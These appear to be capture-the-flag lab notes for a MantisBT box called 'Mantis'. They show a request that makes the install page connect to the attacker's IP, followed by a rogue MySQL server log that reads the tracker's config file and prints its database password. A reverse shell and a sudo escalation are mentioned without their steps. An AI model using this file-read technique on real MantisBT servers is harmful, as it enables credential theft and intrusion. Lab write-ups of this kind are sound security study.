# Mantis \[Inter]

## Report

A public facing SQL endpoint is exploited to read the configuration of Mantis Bug Tracker and find creds for admin. A reverse shell is generated and pspy revelas creds of user 'mantis' who can run anything as root.

## Enumeration

192.168.243.204

### Files

{% hint style="info" %}
This was our mistake thinking this gave us the right version number
{% endhint %}

MantisBT 2.0 \[http://192.168.243.204/bugtracker/doc/en-US/Admin\_Guide/Admin\_Guide.txt]

<figure><img src="../../../.gitbook/assets/image (133).png" alt=""><figcaption><p>pay more attention to the screen and not what could be</p></figcaption></figure>

Read SQL files

```
http://192.168.243.204/bugtracker/admin/install.php?install=3&hostname=192.168.45.233
```

```
php sql.php                                                 
Enter filename to get [/etc/passwd] > /var/www/html/bugtracker/config/config_inc.php
[.] Waiting for connection on 0.0.0.0:3306
[+] Connection from 192.168.243.204:55670 - greet... auth ok... some shit ok... want file... 
[+] /var/www/html/bugtracker/config/config_inc.php from 192.168.243.204:55670:
<?php
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'bugtracker';
$g_db_username            = 'root';
$g_db_password            = 'SuperSequelPassword';

$g_default_timezone       = 'UTC';

$g_crypto_master_salt     = 'OYAxsrYFCI+xsFw3FNKSoBDoJX4OG5aLrp7rVmOCFjU=';
```

### Initial Foothold

You would think this would work&#x20;

{% embed url="https://www.exploit-db.com/exploits/41890" %}

Manually testing the PoC shows there is no value returned for the 'update\_account\_token' which is why it doesn't work, we literally verified it lol

<figure><img src="../../../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

This makes a lot of sense lol, the version number was completely out of our reach

Follow the below thread for getting a reverse shell

## PrivEsc

pspy64 exposes creds for 'mantis' who can sudo everything

## Loot

### Creds



### Flags



## Proof

{% embed url="https://mantisbt.org/bugs/view.php?id=23173" %}

{% embed url="https://mantisbt.org/bugs/view.php?id=26091" %}
